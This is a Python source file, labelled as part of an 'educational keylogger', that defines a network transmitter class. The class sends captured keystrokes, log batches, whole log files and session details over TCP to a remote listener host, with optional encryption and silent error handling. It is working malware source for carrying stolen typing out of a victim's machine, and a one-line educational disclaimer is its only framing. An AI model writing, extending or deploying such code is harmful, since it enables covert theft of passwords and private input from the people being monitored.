"""
Network Transmitter Module for Educational Keylogger
=====================================================
Handles network transmission of log data via TCP sockets.

WARNING: This is for EDUCATIONAL PURPOSES ONLY.
"""

import socket
import json
from datetime import datetime
import os
import platform


class NetworkTransmitter:
    """
    Handles network transmission of log data via TCP sockets.
    """

    def __init__(self, server_host, server_port, use_encryption=False, encryption_key=None):
        """
        Initialize the network transmitter.

        Args:
            server_host: IP address of the listener server
            server_port: Port number of the listener server
            use_encryption: Whether to encrypt data before transmission
            encryption_key: Encryption key if encryption is enabled
        """
        self.server_host = server_host
        self.server_port = server_port
        self.use_encryption = use_encryption
        self.encryption_key = encryption_key
        self.cipher = None

        if use_encryption and encryption_key:
            try:
                from cryptography.fernet import Fernet
                self.cipher = Fernet(encryption_key.encode() if isinstance(encryption_key, str) else encryption_key)
            except ImportError:
                self.use_encryption = False

    def test_connection(self, timeout=5):
        """
        Test connection to the listener server.

        Args:
            timeout: Connection timeout in seconds

        Returns:
            True if connection successful, False otherwise
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                sock.connect((self.server_host, self.server_port))

                test_message = {
                    'type': 'connection_test',
                    'timestamp': datetime.now().isoformat()
                }

                data = json.dumps(test_message).encode('utf-8')
                data_size = len(data).to_bytes(4, byteorder='big')

                sock.sendall(data_size)
                sock.sendall(data)

                response = sock.recv(1024).decode('utf-8')
                return response == 'OK'
        except Exception:
            return False

    def send_data(self, data_string):
        """
        Send a simple data string to the server.

        Args:
            data_string: String data to send

        Returns:
            True if successful, False otherwise
        """
        try:
            message = {
                'type': 'text_data',
                'timestamp': datetime.now().isoformat(),
                'data': data_string
            }

            return self._send_message(message)
        except Exception:
            return False

    def send_keystroke(self, keystroke_data):
        """
        Send a single keystroke event to the server.

        Args:
            keystroke_data: Dictionary containing keystroke information

        Returns:
            True if successful, False otherwise
        """
        try:
            message = {
                'type': 'keystroke',
                'timestamp': datetime.now().isoformat(),
                'data': keystroke_data
            }

            return self._send_message(message)
        except Exception:
            return False

    def send_log_batch(self, log_entries):
        """
        Send a batch of log entries to the server.

        Args:
            log_entries: List of log entry dictionaries

        Returns:
            True if successful, False otherwise
        """
        try:
            message = {
                'type': 'batch',
                'timestamp': datetime.now().isoformat(),
                'count': len(log_entries),
                'data': log_entries
            }

            return self._send_message(message)
        except Exception:
            return False

    def send_file(self, file_path):
        """
        Send a complete log file to the server.

        Args:
            file_path: Path to the file to send

        Returns:
            True if successful, False otherwise
        """
        try:
            if not os.path.exists(file_path):
                return False

            with open(file_path, 'rb') as f:
                file_data = f.read()

            if self.use_encryption and self.cipher:
                file_data = self.cipher.encrypt(file_data)

            message = {
                'type': 'file',
                'timestamp': datetime.now().isoformat(),
                'filename': os.path.basename(file_path),
                'encrypted': self.use_encryption,
                'size': len(file_data)
            }

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(10)
                sock.connect((self.server_host, self.server_port))

                header = json.dumps(message).encode('utf-8')
                header_size = len(header).to_bytes(4, byteorder='big')

                sock.sendall(header_size)
                sock.sendall(header)
                sock.sendall(file_data)

                response = sock.recv(1024).decode('utf-8')
                return response == 'OK'

        except Exception:
            return False

    def send_session_info(self, session_data):
        """
        Send session information to the server.

        Args:
            session_data: Dictionary containing session information

        Returns:
            True if successful, False otherwise
        """
        try:
            message = {
                'type': 'session_info',
                'timestamp': datetime.now().isoformat(),
                'data': session_data
            }

            return self._send_message(message)
        except Exception:
            return False

    def _send_message(self, message):
        """
        Internal method to send a message to the server.

        Args:
            message: Dictionary to send

        Returns:
            True if successful, False otherwise
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(10)
                sock.connect((self.server_host, self.server_port))

                data = json.dumps(message).encode('utf-8')

                if self.use_encryption and self.cipher:
                    data = self.cipher.encrypt(data)

                data_size = len(data).to_bytes(4, byteorder='big')

                sock.sendall(data_size)
                sock.sendall(data)

                response = sock.recv(1024).decode('utf-8')
                return response == 'OK'

        except Exception:
            return False

    def send_disconnect(self, session_id):
        """
        Send disconnect notification to server.

        Args:
            session_id: Session identifier

        Returns:
            True if successful, False otherwise
        """
        try:
            message = {
                'type': 'disconnect',
                'timestamp': datetime.now().isoformat(),
                'session_id': session_id
            }

            return self._send_message(message)
        except Exception:
            return False

